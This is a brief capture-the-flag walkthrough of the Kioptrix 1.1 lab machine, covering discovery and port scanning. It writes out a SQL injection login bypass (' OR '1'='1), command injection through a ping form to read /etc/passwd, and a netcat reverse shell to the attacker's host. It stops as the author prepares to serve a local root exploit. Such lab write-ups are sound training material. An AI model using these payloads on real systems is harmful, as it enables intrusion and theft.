title: Kioptrix 1.1 Walkthrough
---
Kioptrix level 1 is under my belt and its time to move on to the next challenge labled "Kioptrix 1.1". I use netdiscover to find the ip of the new target Kioptrix 1.1.

The ip of our vulnerable virtual machine is 172.16.158.129. I needed to gather more information about the virtual machine so I used nmap to do a basic scan.

Right away I noticed multiple interesting ports to explore. I decided to start with port 80 and I opened up my web browser then pointed it to 172.16.158.129 to see if there are any vulnerable web applications. I am greeted with a login form.

I was able to get in with a simple SQL injection.

Login: Admin
Password: ' OR '1'='1

I was then brought to a form that allows you to ping a mahine on the network. I tried pinging local host with cat of /etc/passwd to see what information the forms would post.

I was able to display the contents of /etc/passwd for later use. However, I still needed to obtain root. I decided to see if I could obtain a shell in a similar way that I displayed /etc/passwd.

I set up netcat to listen for any connects on port 9292 and then entered 127.0.0.1;/usr/local/bin/nc 172.16.158.128 9292 -e '/bin/bash' into the webform and obtained a shell. However, I still wasnt root.

I found a local root exploit but I needed to get it over to kioptrix. I set up a python simple server to host my exploit.
